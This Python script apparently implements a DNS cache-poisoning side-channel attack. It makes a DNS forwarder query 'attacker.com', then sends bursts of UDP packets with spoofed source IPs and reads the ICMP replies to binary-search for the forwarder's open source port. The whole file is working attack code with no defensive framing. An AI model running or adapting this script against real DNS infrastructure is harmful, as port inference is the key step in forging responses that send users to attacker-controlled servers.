import argparse
import random
import socket
import struct
import time
from scapy.all import *
from more_itertools import chunked
from tqdm import tqdm

BURST = 10
DNS_PORT = 53
ATTACK_DOMAIN = "attacker.com"

def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def scan(sport, dst, ports):
    time.sleep(0.1)

    # Create a list of spoofed-IP packets and send it in a burst
    pkts = []
    for p in ports + [1] * (BURST - len(ports)):
        pkt = IP(src=random_ip(), dst=dst)/UDP(sport=sport, dport=p)
        pkts.append(pkt)

    send(pkts, verbose=0)

    # Check if there were open ports through the last burst of packets:
    # If there were open ports, then the forwarder must have had ICMP replies
    # left to send to us.
    verification = IP(dst=dst)/UDP(sport=sport, dport=1)
    res = sr1(verification, verbose=0)

    # There were no open ports, check the next batch of ports
    if res is None:
        return -1

    # An ICMP reply has been received
    elif res[ICMP].type == 3:

        # Only one port left -- must be the one we are looking for
        if len(ports) == 1:
            return ports[0]
        
        # Scan the first half to see if the open port is there
        res = scan(sport, dst, ports[:len(ports) // 2])
        if res > 0:
            return res

        # Scan the other half
        return scan(sport, dst, ports[len(ports) // 2:])

    return -1


if __name__ == "__main__":

    address_parser = argparse.ArgumentParser(description='Inferr the source port of a DNS query')

    address_parser.add_argument('Forwarder',
                        type=str,
                        help='The Forwarder\'s IP address')

    address_parser.add_argument('Resolver',
                        type=str,
                        help='The Recursive Resolver\'s IP address')

    args = address_parser.parse_args()

    forwarder = args.Forwarder
    resolver = args.Resolver

    print(forwarder, resolver)

    # Send a DNS query to the forwarder causing a port to open
    dns_query = IP(dst=forwarder)/UDP(dport=DNS_PORT)/DNS(rd=1, qd=DNSQR(qname=ATTACK_DOMAIN))
    send(dns_query)

    # Start scanning the ports to find the open one
    for ports in tqdm(list(chunked(range(1, 100), BURST)), leave=False):
        result = scan(DNS_PORT, forwarder, ports)
        if result > 0:
            break

    print("Source port is:", result)